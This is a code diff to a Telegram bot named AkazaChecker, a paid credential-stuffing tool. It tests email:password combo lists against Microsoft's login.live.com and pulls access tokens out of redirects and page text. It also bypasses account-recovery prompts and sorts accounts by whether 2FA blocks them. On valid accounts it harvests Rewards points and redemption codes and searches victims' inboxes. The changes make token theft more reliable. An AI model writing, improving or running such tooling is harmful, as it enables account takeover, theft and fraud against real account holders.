@@ -117,7 +117,7 @@ class AkazaDatabase:
 
     def use_credit(self, uid):
         if uid == ADMIN_ID: return
-        self._execute('UPDATE users SET credits = MAX(0, credits - 1), total_checks = total_checks + 1 WHERE user_id = ?', (uid,))
+        self._execute('UPDATE users SET credits = CASE WHEN credits > 0 THEN credits - 1 ELSE 0 END, total_checks = total_checks + 1 WHERE user_id = ?', (uid,))
 
     def get_credits(self, uid) -> int:
         if uid == ADMIN_ID: return 999999
@@ -271,7 +271,10 @@ class AkazaChecker:
                              re.search(r"urlPost:'(.+?)'", text, re.S) or
                              re.search(r'urlPost:"(.+?)"', text, re.S) or
                              re.search(r'<form.*?action="(.+?)"', text, re.S))
-                    if match: return match.group(1).replace('&amp;', '&'), ppft
+                    if match:
+                        up = match.group(1).replace('&amp;', '&')
+                        if up.startswith('/'): up = 'https://login.live.com' + up
+                        return up, ppft
             except: pass
             time.sleep(0.1)
         return None, None
@@ -282,24 +285,44 @@ class AkazaChecker:
                 data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': ppft}
                 headers = {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'}
                 r = self.session.post(urlPost, data=data, headers=headers, allow_redirects=True, timeout=12, verify=False)
-                if '#' in r.url and r.url != SFTAG_URL:
-                    tk = parse_qs(urlparse(r.url).fragment).get('access_token', [None])[0]
-                    if tk and tk != 'None': return ('TOKEN', tk)
-                elif 'cancel?mkt=' in r.text:
+                r = self.handle_fmhf(r)
+
+                all_urls = [r.url] + [h.url for h in r.history]
+                all_texts = [r.text] + [h.text for h in r.history]
+
+                tk = None
+                for u in all_urls:
+                    frag = urlparse(u).fragment
+                    tk = parse_qs(frag).get('access_token', [None])[0]
+                    if tk: break
+                if not tk:
+                    for t in all_texts:
+                        m = re.search(r'access_token=([^&\s"\']+)', t)
+                        if m: tk = m.group(1); break
+                if tk and tk != 'None': return ('TOKEN', tk)
+
+                if 'cancel?mkt=' in r.text:
                     try:
                         ipt = re.search(r'name="ipt".*?value="(.+?)"', r.text).group(1)
                         pprid = re.search(r'name="pprid".*?value="(.+?)"', r.text).group(1)
                         uaid = re.search(r'name="uaid".*?value="(.+?)"', r.text).group(1)
                         act = re.search(r'id="fmHF".*?action="(.+?)"', r.text).group(1)
+                        if act.startswith('/'): act = 'https://login.live.com' + act
                         r2 = self.session.post(act, data={'ipt':ipt, 'pprid':pprid, 'uaid':uaid}, allow_redirects=True, timeout=10, verify=False)
-                        ru = re.search(r'"recoveryCancel":{"returnUrl":"(.+?)"}', r2.text).group(1)
-                        r3 = self.session.get(ru, allow_redirects=True, timeout=10, verify=False)
-                        tk = parse_qs(urlparse(r3.url).fragment).get('access_token', [None])[0]
-                        if tk: return ('TOKEN', tk)
+                        ru_m = re.search(r'"recoveryCancel":{"returnUrl":"(.+?)"}', r2.text)
+                        if ru_m:
+                            ru = ru_m.group(1)
+                            r3 = self.session.get(ru, allow_redirects=True, timeout=10, verify=False)
+                            tk = parse_qs(urlparse(r3.url).fragment).get('access_token', [None])[0]
+                            if tk: return ('TOKEN', tk)
                     except: pass
-                if any(v in r.text for v in ['recover?mkt', 'identity/confirm', 'Email/Confirm', '/Abuse?mkt=']): return ('2FA', None)
-                if any(v in r.text.lower() for v in ['password is incorrect', "account doesn't exist", 'too many times']): return ('BAD', None)
-            except: pass
+
+                if any(v in r.text for v in ['recover?mkt', 'identity/confirm', 'Email/Confirm', '/Abuse?mkt=', 'help us protect', 'account has been locked', 'verification', 'confirm your email']): return ('2FA', None)
+                if any(v in r.text.lower() for v in ['password is incorrect', "account doesn't exist", 'too many times', 'incorrect password']): return ('BAD', None)
+
+                logger.info(f"Login fallback for {email}: URL={r.url} Text[:100]={r.text[:100]}")
+            except Exception as e:
+                logger.error(f"Login try error for {email}: {e}")
         return ('ERROR', None)
 
     def handle_fmhf(self, resp):
@@ -311,7 +334,7 @@ class AkazaChecker:
             data = {i.get('name'): i.get('value', '') for i in form.find_all('input') if i.get('name')}
             action = form.get('action')
             if action.startswith('/'): action = 'https://login.live.com' + action
-            resp = self.session.post(action, data=data, verify=False)
+            resp = self.session.post(action, data=data, timeout=12, verify=False, allow_redirects=True)
         return resp
 
     def get_rewards_points(self):
@@ -442,6 +465,7 @@ class AkazaChecker:
     def scan_inbox(self, tk, cid, uk):
         res = {}
         combined = list(set(list(SERVICE_KEYWORDS.keys()) + uk))
+        if not combined: return {}
         h = {'Authorization': f'Bearer {tk}', 'X-AnchorMailbox': f'CID:{cid}', 'User-Agent': 'Outlook-Android/2.0', 'Content-Type': 'application/json'}
         for i in range(0, len(combined), 8):
             batch = combined[i:i+8]
@@ -474,8 +498,13 @@ class AkazaChecker:
             cid = next((c.value.upper() for c in self.session.cookies if c.name == 'MSPCID'), 'N/A')
 
             if fast:
-                pts = await loop.run_in_executor(bot_executor, self.get_rewards_points)
-                codes = await loop.run_in_executor(bot_executor, self.get_redemption_codes)
+                tasks = [
+                    loop.run_in_executor(bot_executor, self.get_rewards_points),
+                    loop.run_in_executor(bot_executor, self.get_redemption_codes)
+                ]
+                results = await asyncio.gather(*tasks, return_exceptions=True)
+                pts = results[0] if not isinstance(results[0], Exception) else 0
+                codes = results[1] if not isinstance(results[1], Exception) else []
                 return {'status': 'hit', 'email': email, 'password': password, 'pts': pts, 'codes': codes, 'subs': {}, 'name': 'N/A', 'country': 'N/A', 'mc': {'owned': False}, 'inbox': {}}
 
             # Run captures in parallel
@@ -573,8 +602,8 @@ async def handle_combo(u: Update, c: ContextTypes.DEFAULT_TYPE, text=None):
 
     status_msg = await (u.callback_query.message.reply_text("🚀 Starting session...") if u.callback_query else u.message.reply_text("🚀 Starting session..."))
     hits, bad, tfa, err, checked, start_t, last_up, last_h = 0, 0, 0, 0, 0, time.time(), 0, []
-    sid = str(uuid.uuid4().hex[:6])
-    h_f, tfa_f = f"h_{sid}.txt", f"t_{sid}.txt"
+    ts = int(time.time())
+    h_f, tfa_f = f"hits_{uid}_{ts}.txt", f"tfa_{uid}.txt"
     sem, up_lock = asyncio.Semaphore(thr), asyncio.Lock()
 
     async def worker(line):
@@ -647,13 +676,14 @@ async def handle_combo(u: Update, c: ContextTypes.DEFAULT_TYPE, text=None):
         await asyncio.sleep(0.3)
     if tasks: await asyncio.gather(*tasks)
 
-    for f_p, disp in [(h_f, "Hotmails Hits @darkcloudgateway.txt"), (tfa_f, "2fa.txt")]:
+    for f_p in [h_f, tfa_f]:
         if os.path.exists(f_p):
             with open(f_p, 'r') as f: content = f.read()
             with open(f_p, 'w') as f: f.write(f"@larpsupport\n\n{content}\n@larpsupport")
             with open(f_p, 'rb') as f:
-                if u.callback_query: await u.callback_query.message.reply_document(f, filename=disp, caption=f"✅ {disp}")
-                else: await u.message.reply_document(f, filename=disp, caption=f"✅ {disp}")
+                cap = f"✅ {f_p}"
+                if u.callback_query: await u.callback_query.message.reply_document(f, filename=f_p, caption=cap)
+                else: await u.message.reply_document(f, filename=f_p, caption=cap)
             os.remove(f_p)
     if uid in user_proxies: del user_proxies[uid]
 
